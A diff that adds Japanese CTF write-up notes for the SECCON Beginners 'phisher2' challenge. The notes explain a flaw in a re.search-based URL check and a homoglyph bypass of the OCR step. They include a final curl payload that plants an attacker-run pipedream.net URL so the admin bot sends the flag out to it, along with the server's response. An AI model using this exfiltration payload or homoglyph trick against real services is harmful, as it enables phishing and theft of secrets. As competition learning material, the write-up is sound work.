@@ -1,0 +1,34 @@
+OCRで表示されたURLと実際に入力して正規表現とマッチしたURLが一致していればflagパラメータを入れたリクエストが飛ぶという仕組み
+仕組みを把握するまでに長時間かかった...
+
+result = re.search(r"https?://[\w/:&\?\.=]+", text)
+↓
+re.search関数だと先頭に限らずマッチするためここに脆弱性がある．本来はre.matchなら先頭にマッチしないならNoneが返る
+これにより渡すURLはパラメータ部分にも指定できる
+参考：https://note.nkmk.me/python-re-match-search-findall-etc/#search
+
+phisher1がないのにphisher2のため？？？となっていたら去年のSECCON Beginnerで出題されたらしい
+これがヒントとしてデカかった
+https://hack.nikkei.com/blog/ctf4b202206/#chapter2-1
+https://ox0xo.github.io/ctf/ctf4b2022
+
+www.example.com
+↓
+ωωω․еχαмрIе․сом
+
+なので今年はre.search関数とマッチするhttpsの部分のOCRをバイパスすればよかろうという認識
+これが役にたった．
+https://www.irongeek.com/homoglyph-attack-generator.php
+
+https://phisher2.beginners.seccon.games/
+↓
+һttps://phisher2.beginners.seccon.games/
+
+後はflagを受け付ける先をpipedream等で用意してやって最終的に以下↓
+最終ペイロード
+curl -X POST -H "Content-Type: application/json" -d '{"text": "һttps://phisher2.beginners.seccon.games/?a=https://xxxxxxxxxxxxxxxx.m
+.pipedream.net"}' https://phisher2.beginners.seccon.games/
+返り値
+{"input_url":"\u04bbttps://phisher2.beginners.seccon.games/?a=https://xxxxxxxxxxxxxxxx.m.pipedream.net","message":"admin: Very good web site. Thanks for sharing!","ocr_url":"https://phisher2.beginners.seccon.games/?a=https://xxxxxxxxxxxxxxxx.m.pipedream.net"}
+
+一応，ローカルでちゃんとOCRが認識されているかは確認していた．
